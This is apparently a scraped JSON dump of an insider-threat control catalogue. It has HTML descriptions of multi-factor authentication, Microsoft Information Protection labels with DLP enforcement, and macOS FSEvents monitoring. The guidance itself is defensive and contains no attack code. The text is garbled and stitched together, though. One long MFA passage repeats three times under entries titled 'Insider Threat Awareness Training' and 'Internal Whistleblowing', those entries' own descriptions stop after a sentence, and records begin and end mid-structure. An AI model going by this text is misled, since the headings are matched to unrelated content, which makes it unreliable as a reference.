This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}]],"references":[]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

When applied to documents, emails, and other content, MIP labels embed metadata that enforces encryption, access control policies, and usage restrictions \u2014 all of which persist even if the content is shared or moved outside the organization\u2019s environment. This proactive protection mechanism helps to ensure that data loss, misuse, or regulatory breaches are minimized, regardless of where or how the data is accessed.<\/p><p>&nbsp;<\/p><p><strong>Persistent Protection through Azure Rights Management (Azure RMS)<\/strong><br>One of the key features of MIP labels is their ability to enforce encryption and access control via Azure Rights Management (Azure RMS). When a document or email is assigned a sensitivity label such as Highly Confidential, it triggers policies that encrypt the file, limiting who can open it and what actions can be performed. For example, a Highly Confidential document might be encrypted so that only authorized users in specific security groups can access it. Additionally, these policies may prevent recipients from forwarding, printing, copying, or even accessing the document offline, ensuring that sensitive data cannot be shared beyond authorized channels.<\/p><p>&nbsp;<\/p><p><strong>Automatic and Recommended Labeling<\/strong><br>MIP labels also support automatic and recommended labeling. Labels can be automatically applied based on content that is identified as sensitive (such as credit card numbers, Social Security numbers, or intellectual property). This reduces reliance on users to manually select the correct label, ensuring that content is always classified according to its sensitivity level. For example, a file containing financial data or personally identifiable information (PII) may automatically receive a Confidential label, which immediately triggers encryption and access controls. By applying labels automatically, organizations can minimize the risk of human error in classifying sensitive content and ensure that protective measures are consistently applied.<\/p><p>&nbsp;<\/p><p><strong>Enforcing Access Governance and User Restrictions<\/strong><br>MIP labels are directly integrated with Azure Active Directory (Azure AD) and Microsoft 365 security groups, allowing organizations to enforce access governance. Each label can define the users or groups who are permitted to access certain types of content. For example, a document labeled Confidential may be restricted to a specific department or team, preventing unauthorized users from viewing or editing it. Access to content labeled with higher sensitivity, such as Highly Confidential, can be further restricted to executives or security professionals, ensuring that only authorized individuals can access critical business data. These policies persist even when the content is shared outside the organization or accessed on non-corporate devices.<\/p><p>&nbsp;<\/p><p><strong>Blocking Unauthorized Sharing and Transfers<\/strong><br>Through integration with Microsoft Defender for Office 365 and Data Loss Prevention (DLP) policies, MIP labels can enforce automatic blocking of unauthorized sharing or transfer of sensitive content. For example, when a document is labeled as Internal Use Only, any attempt to share it externally via email, cloud storage, or external USB devices can be blocked automatically by DLP policies. Labels can also be configured to restrict sharing links to specific people or groups and can enforce expiration on shared links. This ensures that sensitive data remains within the organization and cannot be accessed by unauthorized individuals or systems.<\/p><p>&nbsp;<\/p><p><strong>Policy Enforcement in Microsoft Teams and SharePoint<\/strong><br>MIP labels are integrated across key collaboration tools like Microsoft Teams and SharePoint, providing seamless protection in the cloud. In these environments, sensitivity labels govern sharing permissions, access rights, and file handling. For instance, if a file is labeled as Confidential, it might be restricted from being shared externally via Teams or SharePoint. These platforms can also prevent file download and sharing for users in unmanaged or non-compliant environments, ensuring that sensitive data cannot be accessed outside the organization's controlled infrastructure. MIP labels also enable policies that enforce restrictions on guest access, preventing external parties from viewing or editing sensitive content unless explicitly permitted.<\/p><p>&nbsp;<\/p><p><strong>Blocking Label Downgrades and Enforcing Label Change Justification<\/strong><br>To prevent unauthorized downgrading of content labels, MIP provides mechanisms to block label downgrades without proper justification. For example, a user may not be allowed to change a document\u2019s label from Confidential to Public without providing an explicit justification. Such actions are logged and may trigger alerts for review by security teams. This ensures that users cannot bypass sensitive information protection policies by reclassifying content to a lower sensitivity level. Moreover, any label changes are auditable, helping organizations track and monitor potential attempts to circumvent security protocols.<\/p><p>&nbsp;<\/p><p><strong>Preventing Exfiltration in Cloud and Endpoint Contexts<\/strong><br>MIP labels integrate with Microsoft Defender for Endpoint and Defender for Cloud Apps, providing protection against exfiltration of sensitive data through cloud and endpoint channels. By applying labels to sensitive documents, organizations can enforce controls that restrict their movement across corporate boundaries. For example, when a file labeled Confidential is accessed from an unmanaged device or through a risky application, it may be blocked from being downloaded or printed, preventing potential exfiltration. Additionally, organizations can configure conditional access policies to prevent data access based on the device\u2019s compliance or security status, ensuring that sensitive information is protected even when users access it from external sources.<\/p>","contributors":[{"name":"The ITM Team"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[{"text":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels","url":"https:\/\/learn.microsoft.com\/en-us\/purview\/create-sensitivity-labels"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-information-protection"},{"text":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms","url":"https:\/\/learn.microsoft.com\/en-us\/azure\/information-protection\/what-is-azure-rms"}]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[]},{"id":"PV022","title":"Internal Whistleblowing","description":"<p>Provide a process for all staff members to report concerning and\/or suspicious behaviour to the organization's security team for review.

This multi-layered approach significantly reduces the risk of unauthorized access, especially in cases where an attacker has obtained or guessed a user\u2019s credentials. MFA is particularly valuable in environments where attackers may have gained access to user credentials via phishing, data breaches, or social engineering.<\/p><p>&nbsp;<\/p><p>For organizations, enabling MFA across all critical systems is essential. This includes systems such as Active Directory, VPNs, cloud platforms (e.g., AWS, Azure, Google Cloud), internal applications, and any resources that store sensitive data. MFA ensures that access control is not solely dependent on passwords, which are vulnerable to compromise. Systems that are protected by MFA require users to authenticate via at least two separate factors: something they know (e.g., a password), and something they have (e.g., a hardware token or a mobile device running an authenticator app).<\/p><p>&nbsp;<\/p><p>The strength of MFA depends heavily on the factors chosen. Hardware-based authentication devices, such as FIDO2 or U2F security keys (e.g., YubiKey), offer a higher level of security because they are immune to phishing attacks. These keys use public-key cryptography, meaning that authentication tokens are never transmitted over the network, reducing the risk of interception. In contrast, software-based MFA solutions, like Google Authenticator or Microsoft Authenticator, generate one-time passcodes (OTPs) that are time-based and typically expire after a short window (e.g., 30 seconds). While software-based tokens offer a strong level of security, they can be vulnerable to device theft or compromise if not properly secured.<\/p><p>&nbsp;<\/p><p>To maximize the effectiveness of MFA, organizations should integrate it with their Identity and Access Management (IAM) system. This ensures that MFA is uniformly enforced across all access points, including local and remote access, as well as access for third-party vendors or contractors. Through integration, organizations can enforce policies such as requiring MFA for privileged accounts (e.g., administrators), as these accounts represent high-value targets for attackers seeking to escalate privileges within the network.<\/p><p>&nbsp;<\/p><p>It is equally important to implement adaptive authentication or risk-based MFA, where the system dynamically adjusts its security requirements based on factors such as user behavior, device trustworthiness, or geographic location. For example, if a subject logs in from an unusual location or device, the system can automatically prompt for an additional factor, further reducing the likelihood of unauthorized access.<\/p><p>&nbsp;<\/p><p>Regular monitoring and auditing of MFA usage are also critical. Organizations should actively monitor for suspicious activity, such as failed authentication attempts or anomalous login patterns. Logs generated by the Authentication Service Providers (ASPs), such as those from Azure AD or Active Directory, should be reviewed regularly to identify signs of attempted MFA bypass, such as frequent failures or the use of backup codes. In addition, setting up alerts for any irregular MFA activity can provide immediate visibility into potential incidents.<\/p><p>&nbsp;<\/p><p>Finally, when a subject no longer requires access, it is critical that MFA access is promptly revoked. This includes deactivating hardware security keys, unlinking software tokens, and ensuring that any backup codes or recovery methods are invalidated. Integration with the organization\u2019s Lifecycle Management system is essential to automate the deactivation of MFA credentials during role changes or when an employee departs.<\/p>","contributors":[{"name":"Patrick Mkhael"}],"platforms":[{"name":"Windows"},{"name":"Linux"},{"name":"MacOS"},{"name":"iOS"},{"name":"Android"}],"references":[]},{"id":"PV038","title":"Insider Threat Awareness Training","description":"<p>Training should equip employees to recognize manipulation tactics, such as social engineering and extortion, that are used to coerce actions and behaviors harmful to the individual and\/or the organization.

This includes file and folder creation, renaming, modifications, movement, extractions (e.g., unzipping archives), deletions, emptying the Trash, and volume mounting or unmounting.<\/p><p>&nbsp;<\/p><p>FSEvents is a macOS-specific API that allows applications to register for notifications of file system changes within a specified directory tree. This mechanism enables efficient tracking of modifications without requiring constant disk scanning, which would be computationally expensive.<br><br>At the kernel level, file system changes trigger notifications that are passed via the special device file <code>\/dev\/fsevents<\/code> to a user-space process called <code>fseventsd<\/code>.
